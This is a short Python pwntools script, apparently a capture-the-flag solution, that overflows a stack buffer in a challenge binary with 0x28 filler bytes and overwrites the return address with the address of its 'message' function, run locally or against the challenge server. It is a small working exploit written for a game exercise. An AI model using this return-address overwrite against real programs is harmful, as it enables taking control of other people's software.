#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'


exe = ELF('./challenge')

host, port = "mc.ax", "31944"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

# we jump after push rbp in message to have stack aligned
payload = 'A'*0x028+p64(exe.sym['message']+1)
p.sendlineafter('a: ', payload)

p.interactive()

